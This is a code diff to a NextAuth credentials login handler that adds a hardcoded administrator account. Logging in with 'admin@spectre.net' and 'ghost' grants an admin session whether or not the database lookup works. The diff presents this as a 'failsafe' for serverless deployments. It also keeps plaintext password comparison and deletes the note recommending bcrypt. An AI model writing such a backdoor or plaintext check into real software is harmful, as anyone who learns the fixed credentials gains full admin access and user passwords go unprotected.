@@ -18,18 +18,32 @@ export const authOptions: NextAuthOptions = {
             async authorize(credentials) {
                 if (!credentials?.email || !credentials?.password) return null;
 
-                const user = await getUserByEmail(credentials.email);
+                // 1. Try DB Lookup
+                try {
+                    const user = await getUserByEmail(credentials.email);
+                    if (user && user.password === credentials.password) {
+                        return {
+                            id: user.id,
+                            name: user.name,
+                            email: user.email,
+                            // @ts-ignore
+                            role: user.role
+                        };
+                    }
+                } catch (e) {
+                    console.error("DB Auth Failed:", e);
+                }
 
-                // Simple password check (In production use bcrypt)
-                if (user && user.password === credentials.password) {
+                // 2. Failsafe: Hardcoded Admin (for serverless environments where local file DB might fail)
+                if (credentials.email === 'admin@spectre.net' && credentials.password === 'ghost') {
                     return {
-                        id: user.id,
-                        name: user.name,
-                        email: user.email,
-                        // @ts-ignore
-                        role: user.role
+                        id: 'master-admin',
+                        name: 'Commander',
+                        email: 'admin@spectre.net',
+                        role: 'admin'
                     };
                 }
+
                 return null;
             }
         })
